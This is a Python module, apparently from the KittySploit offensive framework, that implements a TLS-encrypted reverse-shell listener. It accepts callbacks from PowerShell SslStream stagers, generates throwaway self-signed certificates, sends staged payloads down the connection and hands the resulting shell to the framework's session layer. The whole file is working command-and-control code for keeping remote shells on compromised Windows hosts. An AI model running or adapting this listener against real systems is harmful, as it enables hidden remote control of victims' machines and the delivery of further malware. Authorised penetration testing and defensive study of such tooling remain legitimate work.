#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""TLS-terminated reverse TCP listener for PowerShell SslStream / TLS stagers."""

import socket
import ssl
from pathlib import Path

from kittysploit import *


class Module(Listener):
    __info__ = {
        "name": "Generic Reverse TLS Listener",
        "description": (
            "Accepts TLS-wrapped reverse shell connections (SslStream clients), "
            "then hands plaintext streams to the framework session layer. "
            "Pair with payloads/singles/cmd/windows/powershell_reverse_https."
        ),
        "author": ["KittySploit Team"],
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("0.0.0.0", "Listen address", True)
    lport = OptPort(4443, "Listen port (TLS)", True)
    cert_file = OptString(
        "",
        "Server certificate PEM (empty = generate ephemeral self-signed in memory)",
        False,
        advanced=True,
    )
    key_file = OptString("", "Server private key PEM (required when cert_file is set)", False, advanced=True)

    def _ssl_context(self):
        cert = str(self.cert_file or "").strip()
        key = str(self.key_file or "").strip()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        if cert and key:
            ctx.load_cert_chain(certfile=str(Path(cert).expanduser()), keyfile=str(Path(key).expanduser()))
            return ctx
        # Ephemeral self-signed for lab use
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        import datetime

        key_obj = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "kittysploit-local")])
        cert_obj = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key_obj.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
            .sign(key_obj, hashes.SHA256())
        )
        cert_pem = cert_obj.public_bytes(serialization.Encoding.PEM)
        key_pem = key_obj.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
        import tempfile
        import os

        cert_tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
        key_tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
        try:
            cert_tmp.write(cert_pem)
            cert_tmp.close()
            key_tmp.write(key_pem)
            key_tmp.close()
            ctx.load_cert_chain(certfile=cert_tmp.name, keyfile=key_tmp.name)
        finally:
            for path in (cert_tmp.name, key_tmp.name):
                try:
                    os.unlink(path)
                except OSError:
                    pass
        print_info("Using ephemeral self-signed TLS certificate (30 days)")
        return ctx

    def run(self, background=False):
        if background:
            return self.start()
        try:
            if not hasattr(self, "sock") or self.sock is None:
                host = str(self.lhost or "0.0.0.0")
                port = int(self.lport or 4443)
                print_status(f"Starting TLS listener on {host}:{port}")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock.settimeout(1.0)
                self.sock.bind((host, port))
                self.sock.listen(5)
                self._ssl_ctx = self._ssl_context()
                print_success(f"TLS listening on {host}:{port}")

            try:
                raw, address = self.sock.accept()
                tls = self._ssl_ctx.wrap_socket(raw, server_side=True)
                print_success(f"TLS connection from {address[0]}:{address[1]}")
                extra = {
                    "connection_type": "reverse",
                    "protocol": "tls",
                    "encrypted": True,
                    "stager_line_mode": True,
                }
                try:
                    from core.framework.stager_stage import pop_pending_stage, send_stage_over_socket

                    lhost_key = getattr(self, "lhost", "") or ""
                    if hasattr(lhost_key, "value"):
                        lhost_key = lhost_key.value
                    lhost_key = str(lhost_key or "")
                    lport_raw = getattr(self, "lport", 0) or 0
                    lport_key = int(getattr(lport_raw, "value", lport_raw) or 0)
                    stage = pop_pending_stage(lhost_key, lport_key)
                    if stage:
                        send_stage_over_socket(tls, stage)
                        print_success(f"Staged payload sent ({len(stage)} bytes)")
                        extra["staged"] = True
                except Exception as exc:
                    print_warning(f"Stage delivery skipped: {exc}")
                return (tls, address[0], address[1], extra)
            except socket.timeout:
                return None
        except ImportError:
            print_error("cryptography package required for ephemeral TLS certs (pip install cryptography)")
            return False
        except Exception as exc:
            print_error(f"TLS listener error: {exc}")
            return False
